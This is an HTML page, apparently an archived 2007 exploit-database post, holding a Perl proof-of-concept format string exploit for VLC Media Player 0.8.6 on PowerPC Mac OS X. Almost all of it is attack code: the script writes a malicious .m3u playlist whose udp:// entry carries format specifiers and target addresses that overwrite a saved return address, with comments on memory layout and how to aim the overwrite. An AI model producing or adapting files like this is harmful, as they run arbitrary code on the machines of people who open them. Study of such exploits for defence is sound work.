<html><head><title>VLC Media Player 0.8.6 (udp://) Format String Exploit PoC (ppc)</title></head><pre>#!/usr/bin/perl
#
# http://www.digitalmunition.com/VLCMediaSlayer-ppc.pl
# Code by Kevin Finisterre kf_lists[at]digitalmunition[dot]com
#
# This is just a vanilla format string exploit for OSX on ppc. We overwrite a saved return addy with our shellcode address.
# This code currently overwrites the saved return addy with the stack location of our shellcode.
#
# This exploit will create a malicious .m3u file that will cause VLC Player for OSX to execute arbitrary code.
#

# 0xf02031d2:      &quot;--? 0j? 0h%11$hn.%12$hn&quot;, 'X' &lt;repeats 177 times&gt;...
# 0xf020329a:      'X' &lt;repeats 200 times&gt;...
# 0xf0203362:      'X' &lt;repeats 200 times&gt;...
# 0xf020342a:      'X' &lt;repeats 200 times&gt;...
# 0xf02034f2:      'X' &lt;repeats 194 times&gt;, &quot;ZY&quot;
# 0xf02035b7:      &quot;&quot;
# 0xf02035b8:      'X' &lt;repeats 16 times&gt;, &quot;? 5?\005\017G?? 60&quot;
# 0xf02035d5:      &quot;&quot;
# 0xf02035d6:      &quot;&quot;
# 0xf02035d7:      &quot;\004\005\016

$format =
# make it more robust yourself... I'm lazy
# land in 0xf020 3362 - middle of shellcode
# &quot;%2511%24hn.%2512%24hn&quot; .
#
&quot;%25&quot; . (0x3362-0x24) . &quot;d&quot; . &quot;%25&quot; . &quot;11&quot; . &quot;%24&quot; . &quot;hn&quot; .
&quot;%25&quot; . 0xBCBE . &quot;d&quot; . &quot;%25&quot; . &quot;12&quot; . &quot;%24&quot; . &quot;hn&quot; ;

# 0xf020 3068 saved ret for MsgQueue()
$writeaddr = 0xf0203068;

open(PWNED,&quot;&gt;pwnage.m3u&quot;);

print PWNED &quot;#EXTM3U\n&quot; .&quot;udp://--&quot; . pack('l', $writeaddr+2) . pack('l', $writeaddr) .
$format .&quot;i&quot; x (999 - length(&quot;Can't get file status for &quot;) ) .&quot;\n&quot;;

close(PWNED);

# milw0rm.com [2007-01-02]</pre></html>